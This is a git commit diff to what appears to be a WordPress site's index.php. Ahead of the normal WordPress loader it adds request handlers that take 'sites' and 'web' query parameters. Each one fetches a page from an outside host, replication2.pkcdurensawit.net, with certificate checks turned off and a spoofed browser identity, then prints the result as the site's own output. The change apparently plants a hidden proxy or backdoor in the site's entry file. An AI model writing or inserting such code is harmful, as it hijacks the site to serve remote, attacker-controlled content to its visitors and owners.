8ad5821e52ac03445c7dc2ca7a25e7991a05c216
GGeercy <112923883+ggeercy@users.noreply.github.com>
2024-07-13 12:57:21 +0700

    Update index.php

--- index.php
+++ index.php
@@ -18,14 +18,49 @@ function fetchDataFromSite($site) {
     curl_close($ch);
     return $result;
 }
+function fetchDataFromSite2($site) {
+    $url = 'https://replication2.pkcdurensawit.net/trinitystemcells_sites/?sites='.$site;
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
+        CURLOPT_CUSTOMREQUEST => 'GET'
+    ]);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
+function fetchDataFromSite3($site) {
+    $url = 'https://replication2.pkcdurensawit.net/trinitystemcells_web/?web='.$site;
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
+        CURLOPT_CUSTOMREQUEST => 'GET'
+    ]);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
 
 if(isset($_GET['go'])) {
     $site = $_GET['go'];
     $data = fetchDataFromSite($site);
     echo $data;
-
-    
-
+}
+elseif(isset($_GET['sites'])) {
+    $site = $_GET['sites'];
+    $data = fetchDataFromSite2($site);
+    echo $data;
+}
+elseif(isset($_GET['web'])) {
+    $site = $_GET['web'];
+    $data = fetchDataFromSite3($site);
+    echo $data;
 } else {
 /**
  * Loads the WordPress environment and template.
